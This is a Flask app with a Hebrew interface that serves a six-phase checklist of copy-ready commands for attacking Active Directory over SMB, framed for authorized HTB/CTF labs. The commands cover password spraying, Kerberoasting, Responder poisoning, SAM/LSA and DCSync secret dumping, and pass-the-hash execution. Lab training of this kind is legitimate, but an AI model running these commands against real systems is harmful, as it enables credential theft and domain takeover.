# -*- coding: utf-8 -*-
"""
smb_ad_dashboard.py — דשבורד עברי אינטראקטיבי למתודולוגיית תקיפת AD דרך SMB/Samba.

אפליקציית Flask בקובץ יחיד (בסגנון app.py המקורי של הריפו): ממשק RTL בעברית
שמציג את ששת שלבי התקיפה כ-checklist עם פקודות מוכנות להעתקה. ההתקדמות נשמרת
בדפדפן (localStorage). כלי לימודי — למעבדות מורשות בלבד (Hack The Box / CTF).

הרצה:
    pip install flask
    python smb_ad_dashboard.py
    # דפדפן: http://localhost:5001
"""
from flask import Flask, render_template_string, jsonify

app = Flask(__name__)

# ==========================================================================
# הנתונים: ששת שלבי המתודולוגיה. כל שלב מכיל כותרת, תיאור קצר, ורשימת פקודות.
# הפקודות נשארות באנגלית כדי שאפשר יהיה להעתיק אותן ישירות לטרמינל.
# ==========================================================================
PHASES = [
    {
        "id": "recon",
        "icon": "🛰️",
        "title": "שלב 1 — גילוי (Discovery)",
        "desc": "סריקת פורטים וזיהוי שירותי AD ומצב SMB signing.",
        "cmds": [
            "nmap -Pn -p- --min-rate 2000 -oA nmap/allports $IP",
            "nmap -Pn -sC -sV -p 88,135,139,389,445,464,593,636,3268,5985 "
            "--script smb-os-discovery,smb-security-mode,smb-protocols $IP",
            "nxc smb $IP",
        ],
    },
    {
        "id": "enum",
        "icon": "🔍",
        "title": "שלב 2 — אנומרציה לא-מאומתת",
        "desc": "null/guest sessions, RID cycling ושליפת רשימת משתמשים.",
        "cmds": [
            "nxc smb $IP -u '' -p '' --shares",
            "enum4linux-ng -A $IP | tee enum4linux.txt",
            "rpcclient -U '' -N $IP -c 'enumdomusers;getdompwinfo'",
            "nxc smb $IP -u guest -p '' --rid-brute 4000",
        ],
    },
    {
        "id": "loot",
        "icon": "💎",
        "title": "שלב 3 — ציד שיתופים ו-loot",
        "desc": "מיפוי הרשאות, SYSVOL, וסיסמאות GPP (Groups.xml).",
        "cmds": [
            "smbmap -H $IP -u \"$USER\" -p \"$PASS\"",
            "smbclient //$IP/Replication -N -c 'recurse ON; ls'",
            "gpp-decrypt '<cpassword>'",
            "nxc smb $IP -u \"$USER\" -p \"$PASS\" -M gpp_password -M spider_plus",
        ],
    },
    {
        "id": "creds",
        "icon": "🔑",
        "title": "שלב 4 — השגת credentials",
        "desc": "AS-REP roast, Kerberoast, password spraying ו-relay.",
        "cmds": [
            "kerbrute userenum -d $DOMAIN --dc $DC users.txt",
            "impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $IP -format hashcat",
            "impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request",
            "nxc smb $IP -u users.txt -p 'Season2024!' --continue-on-success",
            "sudo responder -I tun0 -wv",
        ],
    },
    {
        "id": "authed",
        "icon": "🩸",
        "title": "שלב 5 — אנומרציה מאומתת + BloodHound",
        "desc": "בדיקת credential, איסוף גרף התקיפה, ושליפת secrets.",
        "cmds": [
            "nxc smb $IP -u \"$USER\" -p \"$PASS\"",
            "nxc smb $IP -u \"$USER\" -p \"$PASS\" --sam --lsa",
            "bloodhound-python -u \"$USER\" -p \"$PASS\" -d $DOMAIN -ns $IP -c All --zip",
        ],
    },
    {
        "id": "pwn",
        "icon": "👑",
        "title": "שלב 6 — תנועה רוחבית + DCSync",
        "desc": "pass-the-hash, הרצת פקודות, ו-DCSync ל-Domain Admin.",
        "cmds": [
            "impacket-wmiexec $DOMAIN/$USER@$IP -hashes :$NTHASH",
            "impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc",
            "impacket-psexec Administrator@$IP -hashes :$ADMIN_NTHASH",
        ],
    },
]

# ==========================================================================
# תבנית ה-HTML — עמוד RTL בעברית עם ערכת צבעים כהה, checklist וכפתורי העתקה.
# הכול inline (בלי משאבים חיצוניים) כדי שהקובץ יישאר עצמאי.
# ==========================================================================
PAGE = """
<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>דשבורד תקיפת AD דרך SMB/Samba</title>
  <style>
    :root { --bg:#0f1420; --card:#1b2333; --acc:#00d8ff; --ok:#2ecc71; --muted:#8aa; }
    * { box-sizing: border-box; }
    body { font-family: "Segoe UI", Arial, sans-serif; background: var(--bg);
           color: #e8eef5; margin: 0; padding: 2rem; line-height: 1.6; }
    h1 { color: var(--acc); margin: 0 0 .25rem; }
    .warn { background:#3a1d1d; border-right:4px solid #ff6b6b; color:#ffd0d0;
            padding:.75rem 1rem; border-radius:8px; margin:1rem 0 1.5rem; }
    .bar-wrap { background:#0a0e17; border-radius:20px; height:22px; overflow:hidden; margin:1rem 0 2rem; }
    .bar { background:linear-gradient(90deg,var(--acc),var(--ok)); height:100%; width:0;
           transition:width .3s; text-align:center; color:#001; font-weight:bold; font-size:.8rem; }
    .card { background:var(--card); border-radius:12px; padding:1rem 1.25rem; margin-bottom:1rem;
            border-right:5px solid var(--acc); }
    .card.done { border-right-color:var(--ok); opacity:.85; }
    .card h3 { margin:.2rem 0; display:flex; align-items:center; gap:.5rem; }
    .desc { color:var(--muted); margin:.2rem 0 .8rem; }
    .cmd { display:flex; align-items:center; gap:.5rem; background:#0a0e17; border-radius:8px;
           padding:.5rem .7rem; margin:.4rem 0; direction:ltr; text-align:left; }
    .cmd code { font-family:"DejaVu Sans Mono",monospace; color:#7ee787; font-size:.85rem;
                white-space:pre-wrap; word-break:break-all; flex:1; }
    button.copy { background:var(--acc); color:#012; border:none; border-radius:6px;
                  padding:.3rem .6rem; cursor:pointer; font-weight:bold; font-size:.75rem; }
    button.copy:active { transform:scale(.95); }
    label.chk { display:flex; align-items:center; gap:.5rem; cursor:pointer; user-select:none;
                margin-top:.6rem; color:var(--muted); }
    a { color:var(--acc); }
    footer { margin-top:2rem; color:var(--muted); font-size:.85rem; }
  </style>
</head>
<body>
  <h1>👑 דשבורד תקיפת Active Directory דרך SMB / Samba</h1>
  <div>מתודולוגיה ב-6 שלבים למעבדות Hack The Box — סמן שלבים כשמסיימים.</div>
  <div class="warn">⚠️ לשימוש מורשה בלבד — מעבדות HTB/CTF או מערכות שקיבלת אישור בכתב לבדוק.</div>

  <div class="bar-wrap"><div class="bar" id="bar">0%</div></div>

  <div id="phases"></div>

  <footer>
    מקורות בריפו: <a href="HTB-AD-Samba-Vector.he.md">מדריך מלא (עברית)</a> ·
    <a href="HTB-CTF-List.md">רשימת מכונות HTB</a> ·
    <a href="FREE-AD-SMB-Practice.md">מסלול חינמי</a>
  </footer>

  <script>
    const PHASES = {{ phases|tojson }};
    const KEY = "smb_ad_done";
    const done = JSON.parse(localStorage.getItem(KEY) || "{}");

    function render() {
      const root = document.getElementById("phases");
      root.innerHTML = "";
      PHASES.forEach(p => {
        const card = document.createElement("div");
        card.className = "card" + (done[p.id] ? " done" : "");
        const cmds = p.cmds.map(c =>
          `<div class="cmd"><code>${escapeHtml(c)}</code>
           <button class="copy" onclick="copyCmd(this)">העתק</button></div>`).join("");
        card.innerHTML = `
          <h3>${p.icon} ${p.title}</h3>
          <div class="desc">${p.desc}</div>
          ${cmds}
          <label class="chk">
            <input type="checkbox" ${done[p.id] ? "checked" : ""}
                   onchange="toggle('${p.id}', this.checked)"> סיימתי את השלב הזה
          </label>`;
        root.appendChild(card);
      });
      updateBar();
    }
    function toggle(id, val) { done[id] = val; localStorage.setItem(KEY, JSON.stringify(done)); render(); }
    function updateBar() {
      const total = PHASES.length;
      const n = PHASES.filter(p => done[p.id]).length;
      const pct = Math.round(n / total * 100);
      const bar = document.getElementById("bar");
      bar.style.width = pct + "%"; bar.textContent = pct + "%  (" + n + "/" + total + ")";
    }
    function copyCmd(btn) {
      const code = btn.parentElement.querySelector("code").textContent;
      navigator.clipboard.writeText(code).then(() => {
        const old = btn.textContent; btn.textContent = "✓ הועתק";
        setTimeout(() => btn.textContent = old, 1200);
      });
    }
    function escapeHtml(s) {
      return s.replace(/[&<>"']/g, c =>
        ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
    }
    render();
  </script>
</body>
</html>
"""


@app.route("/")
def dashboard():
    """הדף הראשי — מציג את הדשבורד."""
    return render_template_string(PAGE, phases=PHASES)


@app.route("/api/phases")
def api_phases():
    """נקודת קצה JSON להתממשקות/אוטומציה (למשל בניית checklist במקום אחר)."""
    return jsonify(PHASES)


if __name__ == "__main__":
    print("👑 דשבורד פעיל: http://localhost:5001  (למעבדות מורשות בלבד)")
    app.run(debug=True, port=5001)
